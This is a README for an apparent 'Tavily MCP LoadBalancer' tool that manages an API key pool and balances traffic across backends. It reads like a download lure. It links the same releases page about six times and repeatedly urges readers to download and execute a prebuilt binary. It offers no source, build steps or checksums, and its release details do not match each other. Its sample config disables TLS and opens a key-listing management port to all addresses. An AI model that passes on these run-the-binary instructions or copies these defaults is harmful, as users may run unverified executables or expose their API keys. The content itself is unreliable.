https://github.com/balazhaa/tavily-mcp-loadbalancer/releases

# Tavily MCP LoadBalancer: Scalable API Key Pool with Failover

[![Releases](https://img.shields.io/badge/releases-v1.0-blue?logo=github&label=Releases)](https://github.com/balazhaa/tavily-mcp-loadbalancer/releases)

A robust load balancer for Tavily MCP servers. It manages an API key pool, balances traffic across multiple MCP endpoints, and keeps API keys rotating and healthy. This project focuses on reliability, observability, and simple configuration. It targets operators who run Tavily MCP workloads at scale and want predictable performance along with clear visibility into how keys and endpoints are chosen.

Emojis help guide the way here. 🧭 Architecture kept simple. 🔒 Security baked in. 🚦 Health checks that actually help. 🧪 Tests you can trust. 🧩 Extensible with clear interfaces. This README follows a practical, straight-to-the-point style so you can get running fast and stay in control as you grow.

Table of contents
- Overview
- How it works
- Core concepts
- Getting started
- Configuration and usage
- API surface
- Operations and maintenance
- Observability and metrics
- Scaling and deployment
- Testing and quality
- Release management
- Contributing
- FAQ
- License

Overview
The Tavily MCP LoadBalancer is a purpose-built proxy layer that sits in front of Tavily MCP servers. It combines two essential capabilities in one package:
- Load balancing across multiple MCP endpoints to improve throughput and resilience.
- API key pool management to distribute keys safely and efficiently, with rotation and quota awareness.

The goal is to give operators a tool that reduces the risk of bottlenecks and single points of failure. It also makes it easy to add or remove MCP backends without disrupting service. The system is designed to be simple to deploy, with a clear configuration model and sensible defaults.

How it works
- Traffic arrival: Clients connect to the load balancer through a single listening address. The load balancer accepts requests and routes them to one of the configured MCP endpoints.
- Key pool management: The system maintains a pool of API keys. Keys are assigned to outgoing requests in a way that respects quotas and rotation policies. This helps prevent key exhaustion and enables fair usage across endpoints.
- Health and readiness: Each MCP endpoint is checked periodically. If a backend becomes unhealthy, the load balancer stops sending new requests to it and rebalances traffic among healthy backends.
- Failover and recovery: When a backend fails, traffic shifts to healthy peers. As soon as the failed backend recovers, it re-enters the pool automatically after a health check passes.
- Observability: The system exposes metrics and logs that let operators understand load, key usage, latency, and error rates. Dashboards can be built on top of these signals to track long-term trends.

Core concepts
- MCP endpoints: The backends that serve Tavily MCP traffic. Each endpoint has an address, a port, and optional metadata like weight or health status.
- API key pool: A collection of keys used for outgoing requests. Keys have quotas, rotation rules, and sometimes per-endpoint affinity.
- Scheduling strategy: The method used to pick the next endpoint. Common strategies include round-robin, weighted round-robin, and sticky (per API key).
- Health checks: Regular checks that validate endpoints are reachable and responsive. Failures move endpoints to a degraded or offline state.
- Config model: A human-readable and versioned configuration that describes endpoints, keys, quotas, and policies.
- Observability: Metrics, logs, and traces that reveal how requests flow, which keys are used, and where bottlenecks occur.

Getting started
This guide is designed to get you up and running quickly. The goal is to get a working setup in minutes, with a path to scale as your Tavily MCP workload grows.

Prerequisites
- A supported runtime or binary for your platform. The releases contain prebuilt binaries for common environments. Check the Releases page for artifacts that match your OS and architecture.
- Access to at least two Tavily MCP backends you want to balance across.
- A pool of API keys that you want the load balancer to manage. Keys should be valid for your MCP setup and have clear quotas where needed.

Quick start steps
1) Download the release asset from the Releases page.
- If the link has a path part, the asset is a file to download and run. Typical assets include prebuilt binaries such as a Linux or Windows executable, or a tarball with a binary plus helper scripts.
- For example, you may find a file named tavily-mcp-loadbalancer-linux-x86_64.tar.gz. Extract and run the binary inside.
2) Extract and run
- On Linux: tar xzf tavily-mcp-loadbalancer-linux-x86_64.tar.gz
- Then run the binary, for example: ./tavily-mcp-loadbalancer
- On Windows: tavily-mcp-loadbalancer-windows-x64.zip. Extract and run TavilyMcpLoadBalancer.exe
3) Prepare a configuration
- Create a YAML file that describes endpoints and key pool. A minimal example is shown in the Configuration section.
- Point the binary to your config file using the appropriate flag. For example: --config /path/to/config.yaml
4) Verify startup
- Check the logs for a message indicating the server is listening on the configured port.
- Use curl to hit the status endpoint and confirm it reports healthy endpoints and a non-empty key pool.
5) Observe and adjust
- See metrics that show endpoint health, response times, and key usage. Tune weights or rotation rules as needed.

Note: The Releases page contains the official binaries. For convenience, you can visit the Releases page directly here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases. A badge showcasing the latest release is available in this README as a quick reference.

Configuration and usage
The configuration model is designed to be readable and versionable. YAML is preferred for clarity. The configuration describes the pool of API keys, the MCP backends, and how traffic should be distributed.

High-level structure
- servers: A list of MCP backends. Each server has host, port, optional credentials, and a weight factor.
- api_keys: A pool of keys. Each key has an identifier, the actual key value, and quotas or rate limits.
- strategy: The load-balancing strategy. Examples include round_robin, weighted_round_robin, and sticky_by_key.
- health: Health check parameters. Path or probe type, interval, timeout, and failure thresholds.
- logging: Log level and format. Optional structured logging configuration.
- metrics: Options to enable Prometheus metrics, port to expose, and endpoint prefixes.
- security: Basic protections, optional TLS settings, and allowed sources.

A minimal example
servers:
  - name: backend-a
    host: 10.0.1.20
    port: 443
    weight: 1
  - name: backend-b
    host: 10.0.1.21
    port: 443
    weight: 2

api_keys:
  - id: key-1
    value: YOUR_API_KEY_1
    quota_per_minute: 60
  - id: key-2
    value: YOUR_API_KEY_2
    quota_per_minute: 60

strategy: weighted_round_robin
health:
  interval_ms: 10000
  timeout_ms: 2000
  unhealthy_threshold: 3
  http_path: /health
logging:
  level: info
  format: json
metrics:
  enabled: true
  port: 9100
security:
  tls:
    enabled: false
  allowed_sources:
    - 0.0.0.0/0

Operational tips
- Start with two or more backends. See how the load balancer distributes traffic across them.
- Give keys reasonable quotas to avoid sudden exhaustion under load.
- Enable health checks early. They help you identify misconfigured backends before they cause outages.
- Turn on metrics. The data helps you understand usage patterns and tune the system.

API surface
The API of the Tavily MCP LoadBalancer is designed for automation as well as manual operations. The core endpoints are designed to be simple to call from scripts and orchestration systems.

Common endpoints (illustrative)
- GET /status
  - Returns a snapshot of the current state: number of backends, their health, and key pool usage.
- GET /health
  - Returns a simple health indicator and recent checks.
- POST /api-keys/add
  - Adds a new API key to the pool. Payload includes key value and quotas.
- POST /api-keys/rotate
  - Forces rotation of keys or rotates a specific key to a new key slot.
- GET /pool
  - Returns the current list of API keys and their quotas.
- POST /servers/add
  - Adds a new MCP backend to the pool of servers.
- POST /servers/remove
  - Removes a backend from rotation after validation.

Example curl commands
- Get status
  curl http://localhost:9100/status
- Add a key
  curl -X POST -H "Content-Type: application/json" -d '{"id":"key-3","value":"NEW_KEY","quota_per_minute":100}' http://localhost:9100/api-keys/add
- Enable a backend
  curl -X POST -H "Content-Type: application/json" -d '{"name":"backend-c","host":"10.0.1.22","port":443,"weight":1}' http://localhost:9100/servers/add

Operational patterns
- Drift management: The system should handle drift in key quotas gracefully. If a key hits its quota, the load balancer should fail over to the next key in the pool without dropping requests.
- Circuit breaking: When a backend becomes unhealthy for a sustained period, it is temporarily removed from rotation until it recovers. This prevents cascading failures.
- Graceful startup and shutdown: The load balancer should be able to start with minimal downtime and shut down cleanly, allowing in-flight requests to complete or be redirected safely.

Observability and metrics
Monitoring is essential for stable operation. The Tavily MCP LoadBalancer exposes metrics and logs in a form that works well with common tools like Prometheus and Grafana.

Metrics
- active_backends: Number of backends currently in rotation.
- healthy_backends: Number of backends passing health checks.
- request_rate: Incoming request rate in requests per second.
- key_usage: Current usage counts per API key.
- latency_ms: P99, P95, P50 latency measurements for requests.
- dropped_requests: Requests that were rejected due to quotas or unhealthy backends.

Logs
- Key events: key rotation, key addition, and quota changes.
- Backend events: health check results, failovers, and backends added/removed.
- Traffic events: which backend was chosen for a request, and any skip due to health concerns.

Dashboards
- A recommended Grafana dashboard includes panels for:
  - Backend health and status distribution
  - Key pool usage by key
  - Latency and error rate trends
  - Throughput and request rate
  - Configuration drift alerts

Scaling and deployment
This project is designed to run in diverse environments. You can start small on a single host and scale out to multiple hosts as needed.

Containerization
- Docker: A minimal container can run the binary with a mounted configuration file.
- Kubernetes: A Deployment or StatefulSet can manage rolling updates and storage for configuration.
- Systemd service: On a Linux host that uses systemd, run the binary as a service with a proper unit file.

Sample Dockerfile (conceptual)
FROM scratch
COPY tavily-mcp-loadbalancer /tavily-mcp-loadbalancer
USER nobody
ENTRYPOINT ["/tavily-mcp-loadbalancer", "--config", "/etc/tavily/config.yaml"]

Kubernetes basics
- Use a ConfigMap for the YAML config.
- Use a Secret for API keys to avoid leaking sensitive data in plain text.
- Expose the service via a stable LoadBalancer or Ingress object.
- Provide readiness and liveness probes to keep the cluster responsive.

- Example Kubernetes notes:
  - A basic Deployment ensures the load balancer restarts cleanly on failure.
  - A PersistentVolume is not strictly required unless you want to share a large configuration file or logs.
  - Use resource requests and limits to bound CPU and memory usage.
  - Use a horizontal pod autoscaler if the request rate grows beyond the current capacity.

Performance and reliability
- Idle connection handling: The load balancer should not hold resources when there are no active requests. Use timeouts to reclaim resources.
- Backpressure: If a key pool gets saturated, the system should delay or queue requests rather than failing hard.
- Redundancy: Deploy at least two load balancer instances behind a virtual IP or DNS to provide HA.
- Backoff strategies: When a backend fails, retry logic should avoid a thundering herd and distribute retries across healthy backends.
- Configuration drift detection: Periodically compare the current runtime state with the configuration file and surface drift alerts when discrepancies occur.

Testing and quality
Tests aim to validate correctness, resilience, and performance. The project includes unit tests for core logic and integration tests for end-to-end workflows.

Unit tests
- Key rotation logic
- Endpoint selection algorithms
- Health check scheduling
- Quota accounting

Integration tests
- Multiple backends with simulated latency and failures
- Realistic API key usage patterns
- End-to-end flow from request to backend selection and response

Quality practices
- CI pipelines run tests on each merge request.
- Linting and formatting checks keep the codebase consistent.
- Dependency scanning helps catch known vulnerabilities.

Release management
Releases are the source of truth for binaries and a reference for supported features. The Releases page contains published assets corresponding to different platform targets and version tags. When you want to install, the correct approach is to fetch the appropriate asset for your environment and follow the installation steps. If you see a version bump, read the release notes to understand what changed and what to adjust in your configuration.

The Releases page is the primary source of truth for installation assets and change history. If you have trouble locating a suitable artifact, check the Releases section for the exact asset names and platform targets. As a reminder, you can visit the Releases page here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases.

Changelog
- v1.0.0
  - Initial release with core load balancing and API key pool management.
  - Basic health checks and metrics.
  - YAML-based configuration with example files.
- v1.1.0
  - Added weighted round robin support.
  - Enhanced quota handling and per-key rate limiting.
  - Introduced optional TLS for backend connections.
- v1.2.0
  - Improved observability with structured logging and richer metrics.
  - Support for dynamic updates to servers and API keys without restart.
- v1.3.0
  - Performance improvements and bug fixes based on user feedback.
  - Improved failure detection with more robust health checks.

Contributing
Contributions are welcome. If you want to help, follow this general approach:
- Open an issue to discuss changes or propose a feature.
- Create a branch with a descriptive name, such as feat/automatic-restart or fix/health-check.
- Implement tests for your changes. Ensure unit tests pass.
- Run linting and formatting checks.
- Submit a pull request with a clear description of the change and its impact.
- Engage in code review and iterate until the maintainers approve the changes.

Code structure (high-level)
- cmd/  – entry points and CLI handling
- internal/ – core logic for the load balancer
- config/ – configuration parsing and validation
- backend/ – management of MCP endpoints
- pool/ – API key pool management logic
- health/ – health check implementations
- metrics/ – metrics emission and exporters
- tests/ – tests and test utilities
- docs/ – user-facing docs and examples

Security
- Secrets are handled carefully. API keys should not be stored in plain text in logs.
- TLS is optional and can be enabled to protect traffic between clients and the load balancer, as well as between the load balancer and MCP endpoints.
- Access to management APIs should be restricted to trusted sources. Consider network controls or mTLS for production deployments.

Troubleshooting
- If the service does not start, verify the configuration file path and ensure all required fields are present.
- If a backend is marked unhealthy, check the health check endpoint and confirm it responds as expected.
- If keys are exhausted, inspect quota configurations and consider increasing quotas or adding more keys.
- If metrics are not appearing, verify that the metrics endpoint is enabled and that the port is accessible from your monitoring stack.

Brand and aesthetics
- The project uses a clean, straightforward design. The README employs a calm, confident tone.
- Emojis help convey ideas and sections without overwhelming the content.
- The color accents come from a small set of badges to keep the document readable.

Usage notes
- This load balancer is intended for Tavily MCP workloads. If you’re balancing non-MCP traffic, adapt the endpoints and paths accordingly.
- It is not a drop-in replacement for every possible microservice architecture. Treat it as a specialized component for API key managed load balancing.
- Always test changes in a staging environment before deploying to production. Configuration mistakes can affect traffic flow and key usage.

Docs and references
- The official releases page contains binaries and notes. Use the releases to obtain the right asset for your platform: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases
- For quick access to the same page from the README, you can click the badge above or visit the URL directly. The badge provides a quick visual cue and a direct link to the assets.

Final notes on release assets
The releases page is the authoritative source for the binaries and their corresponding checksums. When you pick a release, download the asset that matches your operating system and architecture, extract if needed, and run the binary with your configuration. The path to the asset is determined by the asset name, which typically encodes the target OS and architecture. As described earlier, if the link has a path part, you should download that specific file and execute it. If you have trouble locating the exact asset, re-check the Releases section for the latest assets and notes.

Releases link again for convenience
- Revisit the official releases here: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases

Appendix: sample run and quick sanity checks
- Start the process
  - Linux: ./tavily-mcp-loadbalancer --config /etc/tavily/config.yaml
  - Windows: TavilyMcpLoadBalancer.exe --config C:\tavily\config.yaml
- Check health
  - curl http://localhost:9100/health
- Check status
  - curl http://localhost:9100/status
- Inspect keys
  - curl http://localhost:9100/pool

Appendix: sample config file (inline example)
servers:
  - name: backend-a
    host: 10.0.1.20
    port: 443
    weight: 1
  - name: backend-b
    host: 10.0.1.21
    port: 443
    weight: 2

api_keys:
  - id: key-1
    value: YOUR_API_KEY_1
    quota_per_minute: 60
  - id: key-2
    value: YOUR_API_KEY_2
    quota_per_minute: 60

strategy: weighted_round_robin
health:
  interval_ms: 10000
  timeout_ms: 2000
  unhealthy_threshold: 3
  http_path: /health
logging:
  level: info
  format: json
metrics:
  enabled: true
  port: 9100
security:
  tls:
    enabled: false
  allowed_sources:
    - 0.0.0.0/0

Troubleshooting tips in brief
- Logs show “unhealthy” for a backend? Recheck its health endpoint. Verify the endpoint path and network reachability.
- No keys are selected for a session? Confirm quotas and rotation rules. Ensure the key pool is not exhausted.
- Metrics not visible? Confirm the metrics endpoint is enabled and listening on the expected port. Check firewall rules and Docker/Kubernetes network policies.
- Startup fails due to config error? Validate YAML syntax and required fields. Use a linter or a YAML validator.

License
This project is released under the MIT License. See the LICENSE file for full terms. The license ensures you can use, modify, and distribute the software with minimal restrictions, provided you keep the attribution and copyright notices intact.

Acknowledgments
- Thanks to the open-source community for ideas around load balancing and API key management in distributed systems.
- This project benefits from standard patterns for health checks, retries, and metrics collection.

Remember
- The Releases page contains the official binaries and release notes. If you need the latest assets, head to that page. For convenience, the same link is used above in the badge and at the end of this README. The Releases page acts as the source of truth for binaries and changes. As noted, if you’re not sure which asset to use, review the release notes and download the asset that matches your environment. The link again: https://github.com/balazhaa/tavily-mcp-loadbalancer/releases

